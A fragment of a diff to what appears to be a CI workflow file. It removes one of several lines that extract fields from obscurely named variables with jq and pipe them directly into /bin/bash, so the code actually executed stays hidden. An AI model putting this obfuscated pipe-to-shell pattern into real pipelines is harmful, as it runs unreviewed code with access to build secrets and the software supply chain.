@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$uigy71105" | jq -r .h1460 | /bin/bash
           echo $wh45284 | jq -r .v6622 | /bin/bash
           echo $lj3771 | jq -r .zcmpl10457 | /bin/bash
-          echo $gio8 | jq -r .m99945 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
